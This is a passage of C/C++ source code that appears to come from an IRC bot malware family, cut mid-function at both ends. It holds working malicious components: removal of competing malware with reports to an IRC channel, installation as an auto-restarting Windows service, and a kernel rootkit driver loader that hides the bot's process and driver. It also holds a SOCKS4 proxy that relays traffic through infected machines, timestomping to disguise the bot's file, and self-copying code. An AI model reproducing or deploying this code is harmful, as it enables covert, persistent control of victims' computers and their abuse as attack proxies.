					irc->privmsg(target,"%s Killed process for virus: %s",sec_title,viruses[i].name);
			}
#endif
			GetSystemDirectory(sysdir, sizeof(sysdir));
			sprintf(virusexecutable, "%s\\%s", sysdir, viruses[i].file);
			if (DeleteFile(virusexecutable)!=0)
			{
				viriidel++;
				if (!loop && !silent && verbose)
					irc->privmsg(target,"%s Erased executable for virus: %s",sec_title,viruses[i].name);
			}
		}
		else
		{	// Just for the hell of it
			/*if (KillProcess(viruses[i].file,0))
			{
				GetSystemDirectory(sysdir, sizeof(sysdir));
				sprintf(virusexecutable, "%s\\%s", sysdir, viruses[i].file);
				DeleteFile(virusexecutable);
			}
			Sleep(100);*/
		}

	}
	if (viriifound==0)
	{
		if (!loop && !silent)
			irc->privmsg(target,"%s No known viruses.",sec_title);
	}
	else
	{
		if (!loop && !silent)
			irc->privmsg(target,"%s %s known viruses: R:%.2d, K:%.2d, D:%.2d",sec_title,viriifound,viriireg,viriikill,viriidel);
	}
  
	return;
}
#endif // NO_VIRUSREMOVE
#endif // NO_SECURE


#ifndef NO_SERVICE

SC_HANDLE scm;

extern IRC mainirc;
SERVICE_STATUS ss; 
SERVICE_STATUS_HANDLE ssh; 
VOID WINAPI ShutdownHandler(DWORD Opcode)
{
	DWORD status;
	switch(Opcode)
	{
	case SERVICE_CONTROL_SHUTDOWN:
		if (mainirc.is_connected())
		{
			mainirc.quit("System shutting down.");
			Sleep(FLOOD_DELAY);
			mainirc.disconnect();
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
		ss.dwCurrentState = SERVICE_PAUSED;
		break;
	default:
		break;
	}

	// Send current status. 
	if (!fSetServiceStatus(ssh,&ss))
		status = GetLastError();
	return;
}


int ServiceMain(int argc, char *argv[])
{
	ss.dwServiceType = SERVICE_WIN32; 
	ss.dwCurrentState = SERVICE_START_PENDING; 
	ss.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	ss.dwWin32ExitCode = 0; 
	ss.dwServiceSpecificExitCode = 0; 
	ss.dwCheckPoint = 0; 
	ss.dwWaitHint = 0; 
	ssh = fRegisterServiceCtrlHandler(servicename,ShutdownHandler);

    // not sure if this is needed for the shutdown handler but why not
    ss.dwCurrentState       = SERVICE_RUNNING; 
    ss.dwCheckPoint         = 0; 
    ss.dwWaitHint           = 0; 
	fSetServiceStatus(ssh,&ss);

	DWORD id;
	HANDLE threadhandle;
	//create a new thread pointing to the function that the service will run
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServiceThread, NULL, 0, &id)) == 0)
		return 0;
	//waits for the thread to close and handle to end before the function closes.
	WaitForSingleObject(threadhandle, INFINITE);
	
	CloseHandle(threadhandle);
	return 0;
}

BOOL ReconfigureService(LPSTR lpDesc);
int InstallService(char *svcpath)
{
	DWORD le;
	SC_HANDLE service;
    char path[MAX_PATH];

	sprintf(path, "\"%s\"", svcpath);
	
	//open a handle to SCM with the create service flag
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)))
		return 0;
	//install the service pointing to our .exe with full access rights, with its own process, w/o error reporting, with auto start on boot
	if(!(service = fCreateService(scm, servicename, servicedisplayname, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL)))
	{
		le=GetLastError();
		//if the service already exists..then run it!
		if(le==ERROR_DUPLICATE_SERVICE_NAME || le==ERROR_SERVICE_EXISTS)
		{
			ServiceRun();
		}
		//some shit happened..service couldn't install
		else
			return 0;
	}
	//no error during install..proceed to run the service
	else
	{
		ReconfigureService(servicedesc);
		ServiceRun();
	}
	//cleanup
	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);
	
	return 0;
}

int ServiceRun() 
{ 
    SC_HANDLE service;
//	SERVICE_STATUS status; 
	
	//open a handle to SCM with full control rights
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return 0;
	//gain a handle to our service (ServiceName) with full rights
	if(!(service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS)))
		return 0;
	//start the service w/o argument strings.
	if(fStartService(service, 0, NULL) == 0)
		return 0;
	//cleanup
	fCloseServiceHandle(scm);
    fCloseServiceHandle(service); 
    return 0;
}

DWORD WINAPI ServiceThread(LPVOID param)
{
	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BotThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	ExitThread(0);
}

BOOL ReconfigureService(LPSTR lpDesc) 
{ 
    SC_HANDLE service;
	SC_LOCK sclLock; 
	SC_ACTION scBuf;
	LPQUERY_SERVICE_LOCK_STATUS lpqslsBuf; 
	SERVICE_DESCRIPTION sdBuf;
	SERVICE_FAILURE_ACTIONS sfBuf;
	DWORD dwBytesNeeded; 
	BOOL bSuccess=TRUE;

	//open a handle to SCM with full control rights
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return FALSE;
	//gain a handle to our service (ServiceName) with full rights
	if(!(service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS)))
		return FALSE;
	
	//need to acquire database lock before reconfiguring. 
	//if the database cannot be locked, report the details. 
	if (!(sclLock = fLockServiceDatabase(scm))) 
	{
		if (GetLastError() != ERROR_SERVICE_DATABASE_LOCKED) 
			return FALSE;

		// Allocate a buffer to get details about the lock.
		lpqslsBuf = (LPQUERY_SERVICE_LOCK_STATUS) LocalAlloc(LPTR,sizeof(QUERY_SERVICE_LOCK_STATUS)+256); 
		if (lpqslsBuf == NULL) 
			return FALSE;
 
		// Get and print the lock status information. 
		if (!fQueryServiceLockStatus(scm, lpqslsBuf, sizeof(QUERY_SERVICE_LOCK_STATUS)+256, &dwBytesNeeded)) 
			return FALSE;

		/*if (lpqslsBuf->fIsLocked)
		{
#ifdef _DEBUG
			printf("Locked by: %s, duration: %d seconds\n",lpqslsBuf->lpLockOwner,lpqslsBuf->dwLockDuration); 
#endif
		}*/

		LocalFree(lpqslsBuf); 
	}

	// The database is locked, so it is safe to make changes. 
	// Open a handle to the service. 
	scm = fOpenService(scm, servicename, SERVICE_CHANGE_CONFIG);
	if (service == NULL) 
		return FALSE;

	scBuf.Delay=3000;
	scBuf.Type=SC_ACTION_RESTART;

	sfBuf.lpsaActions=&scBuf;
	sfBuf.cActions=1;
	sfBuf.lpCommand=0;
	sfBuf.lpRebootMsg=0;
	sfBuf.dwResetPeriod=10;

	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfBuf))
		bSuccess = FALSE;

	sdBuf.lpDescription = lpDesc;

	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_DESCRIPTION, &sdBuf))
		bSuccess = FALSE;

	// Release the database lock. 
	fUnlockServiceDatabase(sclLock); 

	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);

	return bSuccess;
}
#endif


#ifndef NO_RDRIV

static BOOL Initialized = FALSE;
HANDLE gh_Device = INVALID_HANDLE_VALUE;

char ac_driverLabel[] = "rdriv";//dont change this unless u know
char ac_driverName[] = "rdriv.sys";//wtf u are doing

DWORD InitDriver()
{
	int iRetCode = ERROR_SUCCESS;
	HANDLE h_Device = INVALID_HANDLE_VALUE;
	DWORD  d_bytesRead, d_error;
	CHAR ac_driverPath[MAX_PATH];
	
    OSVERSIONINFOEX osvi;
    BOOL bOsVersionInfoEx;
	BOOL Found = FALSE;

	int  pid_offset = 0;
	int  flink_offset = 0;
	int  authid_offset = 0;
	int  token_offset = 0; 
	int  privcount_offset = 0;
	int  privaddr_offset  = 0;
	int  sidcount_offset = 0;
	int  sidaddr_offset  = 0;

	int  *os_offsets;

	try 
	{
		if (Initialized)
			return iRetCode;

		// Try calling GetVersionEx using the OSVERSIONINFOEX structure.
		// If that fails, try using the OSVERSIONINFO structure.
		ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

		if( !(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)) )
		{
			// If OSVERSIONINFOEX doesn't work, try OSVERSIONINFO.
			osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
			if (! GetVersionEx ( (OSVERSIONINFO *) &osvi) ) 
			return -1;
		}

		switch (osvi.dwPlatformId)
		{
			// Tests for Windows NT product family.
			case VER_PLATFORM_WIN32_NT:

			// Test for the product.
				if ( osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
				{
					//fprintf(stderr, "Microsoft Windows NT 4.0 ");
					pid_offset = 148;
					flink_offset = 152;
					authid_offset = 24;
					token_offset = 264; 
					privcount_offset = 52;
					privaddr_offset  = 80;
					sidcount_offset = 48;
					sidaddr_offset  = 72;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && \
					      osvi.dwMinorVersion == 0 )
				{
					//fprintf(stderr, "Microsoft Windows 2000 ");
					pid_offset = 156;
					flink_offset = 160;
					authid_offset = 0x18;
					token_offset = 0x12c; 
					privcount_offset = 0x44;
					privaddr_offset  = 0x64;
					sidcount_offset = 0x3c;
					sidaddr_offset  = 0x58;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
				{
					//fprintf(stderr, "Microsoft Windows XP ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 72;
					privaddr_offset  = 104;
					sidcount_offset = 64;
					sidaddr_offset  = 92;

					/* For Service Pack 2 Beta??
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;
					*/

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
				{
					//fprintf(stderr, "Microsoft Windows Server 2003 ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;

					Found = TRUE;
				}

				// Display version, service pack (if any), and build number.
//				if ( osvi.dwMajorVersion <= 4 )
//				{
//					fprintf(stderr, "version %d.%d %s (Build %d)\n",
//					osvi.dwMajorVersion,
//					osvi.dwMinorVersion,
//					osvi.szCSDVersion,
//					osvi.dwBuildNumber & 0xFFFF);
//				}
//				else
//				{ 
//					fprintf(stderr, "%s (Build %d)\n",
//					osvi.szCSDVersion,
//					osvi.dwBuildNumber & 0xFFFF);
//				}
				break;

			default:
				//fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n", osvi.dwMajorVersion, osvi.dwMinorVersion); 
				return -1;
				break; // Never executed
		}
		if (!Found)
		{
			//fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n",
			//	osvi.dwMajorVersion,
			//	osvi.dwMinorVersion); 
			return -1;
		}
		else 
		{
			if (GetCurrentDirectory(MAX_PATH, ac_driverPath))
			{
				strncat(ac_driverPath, "\\", MAX_PATH-strlen(ac_driverPath));
				strncat(ac_driverPath, ac_driverName, MAX_PATH-strlen(ac_driverPath));
			}
			LoadDeviceDriver(ac_driverLabel, ac_driverPath ,&h_Device, &d_error);
			if (h_Device == INVALID_HANDLE_VALUE)
			{
				//fprintf(stderr, "Unable to Load Driver");
				throw d_error;
			}
			gh_Device = h_Device;


			os_offsets = (int *)calloc(1, sizeof(int)*8);
			if (!os_offsets)
			{
				//fprintf(stderr, "Memory allocation failed.\n");
				return -1;
			}

			memcpy(os_offsets, &pid_offset, sizeof(int));
			memcpy(os_offsets + 1, &flink_offset, sizeof(int));
			memcpy(os_offsets + 2, &authid_offset, sizeof(int));
			memcpy(os_offsets + 3, &token_offset, sizeof(int));
			memcpy(os_offsets + 4, &privcount_offset, sizeof(int));
			memcpy(os_offsets + 5, &privaddr_offset, sizeof(int));
			memcpy(os_offsets + 6, &sidcount_offset, sizeof(int));
			memcpy(os_offsets + 7, &sidaddr_offset, sizeof(int));

			if(!DeviceIoControl(gh_Device,
								IOCTL_ROOTKIT_INIT,
								os_offsets,
								sizeof(int)*8,
								NULL,
								0,
								&d_bytesRead,
								NULL))
			{
				//fprintf(stderr, "Error Initializing Driver with offsets.\n");
				throw;
			}
			if (os_offsets)
				free(os_offsets);
		}
	} catch (DWORD error) {
		error=0;//to get rid of the warning
      /*LPVOID lpMsgBuf = NULL;
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  fprintf(stderr, "%s\n",lpMsgBuf);
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);*/

	  return -1;	
	} catch (...) {
      /*LPVOID lpMsgBuf = NULL;
	  DWORD error = 0;
      error = GetLastError();
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  fprintf(stderr, "%s\n",lpMsgBuf);	
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);*/

      return -1;	
	}

	Initialized = TRUE;
	return (iRetCode);
} //InitDriver()

BOOL InitRK(void)
{
	DeleteFile(ac_driverName);
	unsigned long byteswritten;
	HANDLE FileHandle;
	FileHandle=CreateFile(ac_driverName,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (FileHandle == INVALID_HANDLE_VALUE) 
		ExitThread(0); 
	WriteFile(FileHandle,ac_driverData,DSIZE,&byteswritten,0);
	CloseHandle(FileHandle);

	if (FileSize(ac_driverName)!=DSIZE)
	{
		DeleteFile(ac_driverName);
		return FALSE;
	}
	if (InitDriver() == -1)
		return FALSE;
	return TRUE;
}

DWORD HideProc(DWORD pid)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEME,
					(void *) &pid,
					sizeof(DWORD),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}

BOOL HideMe(void)
{
	DWORD pstatus,dstatus;
	DWORD pid = GetCurrentProcessId();
	if (!Initialized)
		return FALSE;
	pstatus=HideProc(pid);
	dstatus=HideDriv(ac_driverName);
	if (pstatus == 0 || dstatus == 0)
		return FALSE;
	else
		return TRUE;
}

DWORD HideDriv(char *driver_name)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEDRIV,
					(void *) driver_name,
					(DWORD) strlen(driver_name),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}




///////////////////////////////////////////////////////////////////////////////////////
// Filename Instdrv.cpp
// Date:    5/27/2003
// Version: 1.0
BOOL LoadDeviceDriver( const char * Name, const char * Path, 
					  HANDLE * lphDevice, PDWORD Error );
BOOL UnloadDeviceDriver( const char * Name );
BOOL InstallDriver( IN SC_HANDLE, IN LPCTSTR, IN LPCTSTR);
BOOL StartDriver( IN SC_HANDLE, IN LPCTSTR);
BOOL OpenDevice( IN LPCTSTR, HANDLE *);
BOOL StopDriver( IN SC_HANDLE, IN LPCTSTR);
BOOL RemoveDriver( IN SC_HANDLE, IN LPCTSTR);

/****************************************************************************
*    FUNCTION: InstallDriver( IN SC_HANDLE, IN LPCTSTR, IN LPCTSTR)
*    PURPOSE: Creates a driver service.
****************************************************************************/
BOOL InstallDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe )
{
    SC_HANDLE  schService;

    //
    // NOTE: This creates an entry for a standalone driver. If this
    //       is modified for use with a driver that requires a Tag,
    //       Group, and/or Dependencies, it may be necessary to
    //       query the registry for existing driver information
    //       (in order to determine a unique Tag, etc.).
    //

    schService = fCreateService(SchSCManager,          // SCManager database
                                DriverName,            // name of service
                                DriverName,            // name to display
                                SERVICE_ALL_ACCESS,    // desired access
                                SERVICE_KERNEL_DRIVER, // service type
                                SERVICE_DEMAND_START,  // start type
                                SERVICE_ERROR_NORMAL,  // error control type
                                ServiceExe,            // service's binary
                                NULL,                  // no load ordering group
                                NULL,                  // no tag identifier
                                NULL,                  // no dependencies
                                NULL,                  // LocalSystem account
                                NULL                   // no password
                                );
    if ( schService == NULL )
        return FALSE;

    fCloseServiceHandle( schService );

    return TRUE;
}

/****************************************************************************
*    FUNCTION: StartDriver( IN SC_HANDLE, IN LPCTSTR)
*    PURPOSE: Starts the driver service.
****************************************************************************/
BOOL StartDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = fOpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );
    if ( schService == NULL )
        return FALSE;

    ret = fStartService( schService, 0, NULL )
       || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING 
	   || GetLastError() == ERROR_SERVICE_DISABLED;

    fCloseServiceHandle( schService );
    return ret;
}

/****************************************************************************
*    FUNCTION: OpenDevice( IN LPCTSTR, HANDLE *)
*    PURPOSE: Opens the device and returns a handle if desired.
****************************************************************************/
BOOL OpenDevice( IN LPCTSTR DriverName, HANDLE * lphDevice )
{
    TCHAR    completeDeviceName[64];
    HANDLE   hDevice;

    //
    // Create a \\.\XXX device name that CreateFile can use
    //
    // NOTE: We're making an assumption here that the driver
    //       has created a symbolic link using it's own name
    //       (i.e. if the driver has the name "XXX" we assume
    //       that it used IoCreateSymbolicLink to create a
    //       symbolic link "\DosDevices\XXX". Usually, there
    //       is this understanding between related apps/drivers.
    //
    //       An application might also peruse the DEVICEMAP
    //       section of the registry, or use the QueryDosDevice
    //       API to enumerate the existing symbolic links in the
    //       system.
    //

	if( (GetVersion() & 0xFF) >= 5 ) {

		//
		// We reference the global name so that the application can
		// be executed in Terminal Services sessions on Win2K
		//
		wsprintf( completeDeviceName, TEXT("\\\\.\\Global\\%s"), DriverName );

	} else {

		wsprintf( completeDeviceName, TEXT("\\\\.\\%s"), DriverName );
	}

    hDevice = CreateFile( completeDeviceName,
                          GENERIC_READ | GENERIC_WRITE,
                          0,
                          NULL,
                          OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL,
                          NULL
                          );
    if ( hDevice == ((HANDLE)-1) )
        return FALSE;

	// If user wants handle, give it to them.  Otherwise, just close it.
	if ( lphDevice )
		*lphDevice = hDevice;
	else
	    CloseHandle( hDevice );

    return TRUE;
}

/****************************************************************************
*    FUNCTION: StopDriver( IN SC_HANDLE, IN LPCTSTR)
*    PURPOSE: Has the configuration manager stop the driver (unload it)
****************************************************************************/
BOOL StopDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE       schService;
    BOOL            ret;
    SERVICE_STATUS  serviceStatus;

    schService = fOpenService( SchSCManager, DriverName, SERVICE_ALL_ACCESS );
    if ( schService == NULL )
        return FALSE;

    ret = fControlService( schService, SERVICE_CONTROL_STOP, &serviceStatus );

    fCloseServiceHandle( schService );

    return ret;
}

/****************************************************************************
*    FUNCTION: RemoveDriver( IN SC_HANDLE, IN LPCTSTR)
*    PURPOSE: Deletes the driver service.
****************************************************************************/
BOOL RemoveDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = fOpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );

    if ( schService == NULL )
        return FALSE;

    ret = fDeleteService( schService );
    fCloseServiceHandle( schService );
    return ret;
}

/****************************************************************************
*    FUNCTION: UnloadDeviceDriver( const TCHAR *)
*    PURPOSE: Stops the driver and has the configuration manager unload it.
****************************************************************************/
BOOL UnloadDeviceDriver( const TCHAR * Name )
{
	SC_HANDLE	schSCManager;

	schSCManager = fOpenSCManager(	NULL,                 // machine (NULL == local)
                              		NULL,                 // database (NULL == default)
									SC_MANAGER_ALL_ACCESS // access required
								);

	StopDriver( schSCManager, Name );
	RemoveDriver( schSCManager, Name );
	 
	fCloseServiceHandle( schSCManager );

	return TRUE;
}

/****************************************************************************
*    FUNCTION: LoadDeviceDriver( const TCHAR, const TCHAR, HANDLE *)
*    PURPOSE: Registers a driver with the system configuration manager 
*	 and then loads it.
****************************************************************************/
BOOL LoadDeviceDriver( const TCHAR * Name, const TCHAR * Path, 
					  HANDLE * lphDevice, PDWORD Error )
{
	SC_HANDLE	schSCManager;
	BOOL		okay;

	schSCManager = fOpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

	// Remove old instances
	RemoveDriver( schSCManager, Name );

	// Ignore success of installation: it may already be installed.
	InstallDriver( schSCManager, Name, Path );

	// Ignore success of start: it may already be started.
	StartDriver( schSCManager, Name );

	// Do make sure we can open it.
	okay = OpenDevice( Name, lphDevice );
	*Error = GetLastError();
 	fCloseServiceHandle( schSCManager );

	return okay;
}

#endif


#ifndef NO_SOCK4SERV
#define SOCKS4_CONNECT 1
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91

typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
} SOCKS4HEADER;

void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		ZeroMemory(buf,sizeof(buf));
		fselect(0, &fd, NULL, NULL, NULL);

		if(fFD_ISSET(client, &fd))
		{
			if((len = frecv(client,buf,sizeof(buf),0))== -1) break;
			if(fsend(target,buf,len,0)== -1) break;
		}
	    if (fFD_ISSET(target,&fd))
		{
			if((len = frecv(target,buf,sizeof(buf),0))== -1) break;
			if(fsend(client,buf,len,0)== -1) break;
		}
	}
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	TIMEVAL timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (fselect(0, &fd, NULL, NULL, &timeout) == 0)
	{
		fclosesocket(client);
		return 0;
	}
	if (frecv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		fclosesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		fclosesocket(client);
		return 0;
	}
	ZeroMemory(&target_in,sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fconnect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		ZeroMemory(&hdr.userid,1024);
		fsend(client, (char *)&hdr, 8, 0);
		fclosesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	ZeroMemory(&hdr.userid,1024);
	fsend(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}

DWORD WINAPI SocksDaemon(LPVOID param)
{
	NTHREAD socks4 = *((NTHREAD*)param);
	NTHREAD *socks4s = (NTHREAD *)param;
	socks4s->gotinfo = TRUE;
	//IRC* irc=(IRC*)socks4.conn;

	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = fhtons(socks4.idata1);
	info.sin_addr.s_addr = INADDR_ANY;
	server = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fbind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		clearthread(socks4.threadnum);
		ExitThread(0);
	}
	if (flisten(server, 10) != 0)
	{
		clearthread(socks4.threadnum);
		ExitThread(0);
	}
	while (TRUE)
	{
		client = faccept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	clearthread(socks4.threadnum);
	ExitThread(0);
}
#endif


#ifdef _DEBUG
extern char debug_log[];
extern char debug_log_mode[];
//Thanks Akcom
void DbgPrintFile(char *Format, ...)
{
	va_list va;
	va_start(va,Format);
	char buf[1024];
	vsprintf(buf,Format,va);
	va_end(va);
	SYSTEMTIME st;
	GetSystemTime(&st);
	char OutStr[64];
	GetDateFormat(LOCALE_SYSTEM_DEFAULT,0,&st,"MM/dd/yyyy",OutStr,sizeof(OutStr));
	FILE *f=fopen(debug_log,debug_log_mode);
	if (f)
	{
		fprintf(f,"[%s] %s",OutStr,buf);
		fclose(f);
	}
}
#endif

int SplitParams(char *a[MAX_TOKENS],char *line,int depth)
{
	a[0]=strtok(line," ");
	int i;
	for (i=1;i<depth;i++)
	{
		a[i]=strtok(NULL," ");
		if (a[i])
			continue;
		else
			break;
	}
	return i;
}


//http://www.nirsoft.net/vc/isfileexist.html
BOOL FileExists(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
		return TRUE;
}

BOOL IsFolder(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
	{
		if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			return TRUE;
		else
			return FALSE;
	}
}

/*BOOL FileExists(char *Filename)
{
	FILE *fp;
	if ((fp = fopen(Filename,"r")) == NULL)
		return FALSE;
	else
	{
		fclose(fp);
		return TRUE;
	}
}*/

// File size function from OmegaII
size_t FileSize(const char *filename)
{
	unsigned short  multiplier=0, fread_ret=0, feof_ret=0;
	char char_count[1024];
	FILE *stream;

	stream = fopen(filename, "rb");
	while(fread_ret = fread(char_count, sizeof(char), sizeof(char_count), stream))
	{
		if (fread_ret < 1024)
		{
			feof_ret = feof(stream);
			if (feof_ret != 0)
				return (sizeof(char_count) * multiplier)+fread_ret;
			else
				return 0;
		}
		else
			multiplier++;
	}
	return (sizeof(char_count) * multiplier)+fread_ret;
}
/*
int FileSize(const char * szFileName) 
{ 
	struct stat fileStat; 
	int err = stat( szFileName, &fileStat ); 
	if (0 != err) return 0; 
	return fileStat.st_size; 
}
*/

BOOL SetFileTime(char *TargetFile)
{
	/*
		Gets the filetime of the computers shell file (usually Explorer.exe), from the registry
		and then sets the target file to the same filetime. The shell file, unless a custom one,
		should be the orignal date of the OS install; this is good for hiding your file when
		located in GetSystemDirectory().
			-SourceX
	*/
	HANDLE hShell;
	FILETIME ft;
	char cWindowsDir[MAX_PATH];
	char *cShellFile;

	GetWindowsDirectory(cWindowsDir,sizeof(cWindowsDir));
	cShellFile=RegQuery(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","Shell");
	if (cShellFile)
	{
		strcat(cWindowsDir,cShellFile);
		hShell=CreateFile(cWindowsDir,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

		if (hShell != INVALID_HANDLE_VALUE) 
		{
			GetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
			CloseHandle(hShell);
			hShell = CreateFile(TargetFile,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

			if (hShell != INVALID_HANDLE_VALUE) 
			{
				SetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
				CloseHandle(hShell);

				return TRUE;
			}
		}
	}
	return FALSE;
}

BOOL MoveBot(char *MoveToPath, char *Filename)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MoveToPath,Filename);
	strcpy(CurrentPath,CurrentPathF);
	fPathRemoveFileSpec(CurrentPath);
	
#ifdef _DEBUG
		printf("MoveToPath:   %s\n"
			   "MoveToPathF:  %s\n"
			   "Filename:     %s\n"
			   "CurrentPath:  %s\n"
			   "CurrentPathF: %s\n",MoveToPath,MoveToPathF,Filename,CurrentPath,CurrentPathF);
#endif

	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();

#ifdef _DEBUG
			printf("Couldn't copy file, error: %d.\n",result);
#endif

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			}
